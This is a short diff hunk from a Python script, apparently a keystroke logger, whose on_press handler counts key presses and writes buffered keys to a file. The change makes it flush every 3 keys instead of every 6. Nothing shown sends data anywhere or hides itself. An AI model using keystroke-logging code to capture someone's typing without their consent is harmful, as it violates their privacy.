@@ -11,7 +11,7 @@ def on_press(key):
     count += 1
     print(f"{key} pressed")
 
-    if count >= 6:
+    if count >= 3:
         count = 0
         write_file(keys)
         keys = []
